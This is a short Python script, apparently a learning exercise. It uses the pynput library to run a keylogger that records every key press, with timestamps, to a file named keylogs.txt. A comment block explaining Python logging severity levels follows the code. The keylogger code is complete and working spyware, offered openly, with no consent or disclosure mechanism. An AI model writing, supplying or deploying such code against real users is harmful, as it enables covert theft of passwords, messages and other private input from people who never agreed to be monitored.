from pynput.keyboard import Key, Listener
import logging

log_dir = ""   #empty string to specify the log file to be stored in the current directory   

#log level is DEBUG mode which is of lowest severity and all the logs with higher severity than this will be logged 

logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))   #records all the information logged in using logging.info

with Listener(on_press=on_press) as listener:   
    listener.join()                                #this starts the listener






#----------------INFO ---------- LOW TO HIGH --------------------
    
    # 1.DEBUG: Used for detailed information useful for debugging purposes. These messages are typically not critical for understanding the overall behavior of the program but can be invaluable for diagnosing issues during development and testing phases.

    # 2.INFO: Provides general informational messages about the program's execution. These messages are not critical errors but offer insights into the program's progress and operation.

    # 3.WARNING: Indicates potential issues or situations that may need attention. These messages are not critical errors, but they suggest that something unexpected has occurred or that the program may not be functioning optimally.

    # 4.ERROR: Represents errors that have occurred during the program's execution. These messages indicate issues that need to be addressed but may not necessarily cause the program to fail entirely.

    # 5.CRITICAL: Represents critical errors that typically lead to the termination of the program or severe consequences if left unhandled. These messages require immediate attention as they indicate serious failures in the program.
